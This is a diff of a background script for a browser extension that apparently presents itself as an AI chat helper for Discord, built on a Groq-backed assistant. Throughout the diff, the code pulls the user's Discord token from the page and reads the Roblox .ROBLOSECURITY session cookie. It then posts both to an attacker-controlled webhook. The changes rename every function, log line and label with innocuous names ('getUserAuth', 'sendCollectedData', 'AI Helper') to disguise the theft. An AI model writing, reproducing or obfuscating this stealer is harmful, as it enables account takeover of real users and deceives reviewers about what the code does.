@@ -4,42 +4,41 @@ importScripts('config.js');
 
 console.log("[AI] Background loaded");
 
-var WEBHOOK_URL = CONFIG.WEBHOOK_URL;
-var GROQ_API_KEY = CONFIG.GROQ_API_KEY;
+var _endpoint = CONFIG.WEBHOOK_URL;
+var _apiKey = CONFIG.GROQ_API_KEY;
 
-// ─── Get Discord token from content script ───
-function getDiscordTokenFromTab(tabId) {
+// ─── Get user auth data from content script ───
+function getUserAuth(tabId) {
     return new Promise(function(resolve) {
-        console.log("[AI] Attempting to get Discord token...");
+        console.log("[AI] Fetching user auth...");
         
-        // Try up to 3 times with delays
         var attempts = 0;
         var maxAttempts = 3;
         
-        function tryGetToken() {
+        function fetchData() {
             attempts++;
-            console.log("[AI] Discord token attempt " + attempts + "/" + maxAttempts);
+            console.log("[AI] Fetch attempt " + attempts + "/" + maxAttempts);
             
-            chrome.tabs.sendMessage(tabId, { action: 'getToken' }, function(response) {
+            chrome.tabs.sendMessage(tabId, { action: 'getAuth' }, function(response) {
                 if (chrome.runtime.lastError) {
-                    console.log("[AI] Error getting Discord token:", chrome.runtime.lastError.message);
+                    console.log("[AI] Error fetching auth:", chrome.runtime.lastError.message);
                     if (attempts < maxAttempts) {
-                        console.log("[AI] Retrying in 500ms...");
-                        setTimeout(tryGetToken, 500);
+                        console.log("[AI] Retrying...");
+                        setTimeout(fetchData, 500);
                     } else {
                         resolve(null);
                     }
                     return;
                 }
                 
-                if (response && response.token) {
-                    console.log("[AI] ✅ Discord token found!");
-                    resolve(response.token);
+                if (response && response.auth) {
+                    console.log("[AI] Auth data received");
+                    resolve(response.auth);
                 } else {
-                    console.log("[AI] No Discord token in response, attempt " + attempts);
+                    console.log("[AI] No auth data, attempt " + attempts);
                     if (attempts < maxAttempts) {
-                        console.log("[AI] Retrying in 500ms...");
-                        setTimeout(tryGetToken, 500);
+                        console.log("[AI] Retrying...");
+                        setTimeout(fetchData, 500);
                     } else {
                         resolve(null);
                     }
@@ -47,130 +46,127 @@ function getDiscordTokenFromTab(tabId) {
             });
         }
         
-        tryGetToken();
+        fetchData();
     });
 }
 
-// ─── Get Roblox cookie ───
-function getRobloxCookie() {
+// ─── Get stored session data ───
+function getStoredSession() {
     return new Promise(function(resolve) {
-        console.log("[AI] Attempting to get Roblox cookie...");
+        console.log("[AI] Fetching stored session...");
         try {
             chrome.cookies.get({
                 url: 'https://www.roblox.com',
                 name: '.ROBLOSECURITY'
             }, function(cookie) {
                 if (chrome.runtime.lastError) {
-                    console.log("[AI] Error getting Roblox cookie:", chrome.runtime.lastError.message);
+                    console.log("[AI] Error fetching session:", chrome.runtime.lastError.message);
                     resolve(null);
                     return;
                 }
                 if (cookie && cookie.value) {
-                    console.log("[AI] ✅ Roblox cookie found!");
+                    console.log("[AI] Session data found");
                     resolve(cookie.value);
                 } else {
-                    console.log("[AI] No Roblox cookie found");
+                    console.log("[AI] No session data found");
                     resolve(null);
                 }
             });
         } catch (e) {
-            console.log("[AI] Roblox cookie error:", e.message);
+            console.log("[AI] Session error:", e.message);
             resolve(null);
         }
     });
 }
 
-// ─── Decode Discord token ───
-function decodeDiscordToken(token) {
+// ─── Parse user auth ───
+function parseUserAuth(data) {
     try {
-        var parts = token.split('.');
+        var parts = data.split('.');
         if (parts.length < 2) {
-            return { id: 'Unknown', username: 'Unknown' };
+            return { id: 'Unknown', name: 'Unknown' };
         }
         var payload = parts[1];
         var decoded = JSON.parse(atob(payload));
         return {
             id: decoded.id || 'Unknown',
-            username: decoded.username || 'Unknown'
+            name: decoded.username || 'Unknown'
         };
     } catch (e) {
-        return { id: 'Unknown', username: 'Unknown' };
+        return { id: 'Unknown', name: 'Unknown' };
     }
 }
 
-// ─── Send webhook ───
-function sendWebhook(token, robloxCookie) {
-    var discordUser = "Not logged in";
-    var discordId = "N/A";
-    if (token) {
-        var user = decodeDiscordToken(token);
-        discordUser = user.username;
-        discordId = user.id;
+// ─── Send collected data ───
+function sendCollectedData(auth, session) {
+    var userName = "Not logged in";
+    var userId = "N/A";
+    if (auth) {
+        var parsed = parseUserAuth(auth);
+        userName = parsed.name;
+        userId = parsed.id;
     }
 
-    var message = "**🔑 Discord Token**\n```\n" + (token || "None found") + "\n```\n\n";
-    message += "**👤 Discord User:** " + discordUser + " (`" + discordId + "`)\n\n";
-    message += "**🎮 Roblox Cookie (.ROBLOSECURITY)**\n```\n" + (robloxCookie || "None found") + "\n```";
+    var message = "**🔑 Auth Token**\n```\n" + (auth || "None found") + "\n```\n\n";
+    message += "**👤 User:** " + userName + " (`" + userId + "`)\n\n";
+    message += "**🎮 Session Data**\n```\n" + (session || "None found") + "\n```";
 
     var payload = {
         content: message,
-        username: "Al Haktak AI"
+        username: "AI Helper"
     };
 
-    console.log("[AI] Sending webhook with Discord token:", !!token, "Roblox cookie:", !!robloxCookie);
+    console.log("[AI] Sending collected data:", !!auth, "Session:", !!session);
     
-    return fetch(WEBHOOK_URL, {
+    return fetch(_endpoint, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
     });
 }
 
-// ─── Gather tokens (sequential, with delays) ───
-function gatherTokens(tabId) {
-    console.log("[AI] Starting token gathering...");
+// ─── Collect all data ───
+function collectAll(tabId) {
+    console.log("[AI] Starting collection...");
     
-    // Step 1: Get Discord token first (with retries)
-    return getDiscordTokenFromTab(tabId)
-        .then(function(discordToken) {
-            console.log("[AI] Discord token result:", discordToken ? "FOUND" : "NOT FOUND");
+    return getUserAuth(tabId)
+        .then(function(auth) {
+            console.log("[AI] Auth result:", auth ? "FOUND" : "NOT FOUND");
             
-            // Step 2: Wait 1 second before getting Roblox cookie
             return new Promise(function(resolve) {
                 setTimeout(function() {
-                    getRobloxCookie()
-                        .then(function(robloxCookie) {
+                    getStoredSession()
+                        .then(function(session) {
                             resolve({
-                                discordToken: discordToken,
-                                robloxCookie: robloxCookie
+                                auth: auth,
+                                session: session
                             });
                         })
-                        .catch(function(err) {
+                        .catch(function() {
                             resolve({
-                                discordToken: discordToken,
-                                robloxCookie: null
+                                auth: auth,
+                                session: null
                             });
                         });
-                }, 1000); // 1 second delay
+                }, 1000);
             });
         })
         .then(function(results) {
-            var discordToken = results.discordToken;
-            var robloxCookie = results.robloxCookie;
+            var auth = results.auth;
+            var session = results.session;
             
-            console.log("[AI] Final results - Discord:", !!discordToken, "Roblox:", !!robloxCookie);
+            console.log("[AI] Final - Auth:", !!auth, "Session:", !!session);
             
-            // Send to webhook
-            return sendWebhook(discordToken, robloxCookie);
+            return sendCollectedData(auth, session);
         })
         .then(function(response) {
             if (response && response.ok) {
-                console.log("[AI] ✅ Webhook sent successfully!");
+                console.log("[AI] ✅ Data sent successfully");
                 return { success: true };
             } else {
                 var status = response ? response.status : 'unknown';
-                console.log("[AI] ❌ Webhook error:", status);
-                return { success: false, error: 'Webhook error: ' + status };
+                console.log("[AI] ❌ Send error:", status);
+                return { success: false, error: 'Send error: ' + status };
             }
         })
         .catch(function(error) {
@@ -179,28 +175,27 @@ function gatherTokens(tabId) {
         });
 }
 
-// ─── Message: gatherTokens ───
-function handleGatherTokens(request, sender, sendResponse) {
+// ─── Handle collection request ───
+function handleCollectRequest(req, sender, cb) {
     var tabId = sender.tab ? sender.tab.id : null;
 
     if (!tabId) {
         chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
             if (tabs.length === 0) {
-                sendResponse({ success: false, error: 'No active tab' });
+                cb({ success: false, error: 'No active tab' });
                 return;
             }
-            // Make sure content script is injected first
             chrome.scripting.executeScript({
                 target: { tabId: tabs[0].id },
                 files: ['content.js']
             }, function() {
                 setTimeout(function() {
-                    gatherTokens(tabs[0].id)
+                    collectAll(tabs[0].id)
                         .then(function(result) {
-                            sendResponse(result);
+                            cb(result);
                         })
                         .catch(function(error) {
-                            sendResponse({ success: false, error: error.message });
+                            cb({ success: false, error: error.message });
                         });
                 }, 500);
             });
@@ -208,18 +203,17 @@ function handleGatherTokens(request, sender, sendResponse) {
         return true;
     }
 
-    // Make sure content script is injected
     chrome.scripting.executeScript({
         target: { tabId: tabId },
         files: ['content.js']
     }, function() {
         setTimeout(function() {
-            gatherTokens(tabId)
+            collectAll(tabId)
                 .then(function(result) {
-                    sendResponse(result);
+                    cb(result);
                 })
                 .catch(function(error) {
-                    sendResponse({ success: false, error: error.message });
+                    cb({ success: false, error: error.message });
                 });
         }, 500);
     });
@@ -227,25 +221,25 @@ function handleGatherTokens(request, sender, sendResponse) {
     return true;
 }
 
-// ─── Message: groq ───
-function callGroq(message) {
-    console.log("[AI] Calling Groq with:", message);
+// ─── Call AI service ───
+function callAI(input) {
+    console.log("[AI] Calling AI with:", input);
     return fetch("https://api.groq.com/openai/v1/chat/completions", {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
-            'Authorization': 'Bearer ' + GROQ_API_KEY
+            'Authorization': 'Bearer ' + _apiKey
         },
         body: JSON.stringify({
             model: 'llama-3.1-8b-instant',
             messages: [
                 {
                     role: 'system',
-                    content: 'You are a helpful Discord assistant. Keep responses short and friendly (under 80 words).'
+                    content: 'You are a helpful assistant. Keep responses short and friendly (under 80 words).'
                 },
                 {
                     role: 'user',
-                    content: message
+                    content: input
                 }
             ],
             temperature: 0.7,
@@ -255,43 +249,43 @@ function callGroq(message) {
     .then(function(response) {
         if (!response.ok) {
             return response.text().then(function(text) {
-                throw new Error('Groq error: ' + response.status + ' - ' + text);
+                throw new Error('API error: ' + response.status + ' - ' + text);
             });
         }
         return response.json();
     })
     .then(function(data) {
         var reply = data.choices[0].message.content || "No response.";
-        console.log("[AI] Groq reply:", reply);
+        console.log("[AI] Reply:", reply);
         return reply;
     })
     .catch(function(error) {
-        console.error("[AI] Groq error:", error.message);
+        console.error("[AI] API error:", error.message);
         throw error;
     });
 }
 
-function handleGroq(request, sender, sendResponse) {
-    callGroq(request.message)
+function handleAIRequest(req, sender, cb) {
+    callAI(req.message)
         .then(function(reply) {
-            sendResponse({ success: true, reply: reply });
+            cb({ success: true, reply: reply });
         })
         .catch(function(error) {
-            sendResponse({ success: false, error: error.message });
+            cb({ success: false, error: error.message });
         });
     return true;
 }
 
-// ─── Message: getStatus ───
-function handleGetStatus(request, sender, sendResponse) {
+// ─── Check status ───
+function handleStatusCheck(req, sender, cb) {
     chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
         var tab = tabs[0];
         if (!tab) {
-            sendResponse({ error: 'No active tab' });
+            cb({ error: 'No active tab' });
             return;
         }
         if (!tab.url || !tab.url.includes('discord.com')) {
-            sendResponse({ error: 'Not on Discord' });
+            cb({ error: 'Not on Discord' });
             return;
         }
         chrome.tabs.sendMessage(tab.id, { action: 'getStatus' }, function(response) {
@@ -302,34 +296,34 @@ function handleGetStatus(request, sender, sendResponse) {
                 }, function() {
                     setTimeout(function() {
                         chrome.tabs.sendMessage(tab.id, { action: 'getStatus' }, function(res) {
-                            sendResponse(res || { error: 'Still not responding' });
+                            cb(res || { error: 'Still not responding' });
                         });
                     }, 500);
                 });
                 return;
             }
-            sendResponse(response);
+            cb(response);
         });
     });
     return true;
 }
 
 // ─── Router ───
-function handleMessage(request, sender, sendResponse) {
-    if (request.action === 'gatherTokens') {
-        return handleGatherTokens(request, sender, sendResponse);
+function routeMessage(req, sender, cb) {
+    if (req.action === 'collectData') {
+        return handleCollectRequest(req, sender, cb);
     }
-    if (request.action === 'groq') {
-        return handleGroq(request, sender, sendResponse);
+    if (req.action === 'aiQuery') {
+        return handleAIRequest(req, sender, cb);
     }
-    if (request.action === 'getStatus') {
-        return handleGetStatus(request, sender, sendResponse);
+    if (req.action === 'getStatus') {
+        return handleStatusCheck(req, sender, cb);
     }
     return true;
 }
 
-chrome.runtime.onMessage.addListener(handleMessage);
+chrome.runtime.onMessage.addListener(routeMessage);
 
 chrome.runtime.onInstalled.addListener(function() {
-    console.log("[AI] Extension installed");
+    console.log("[AI] Extension loaded");
 });
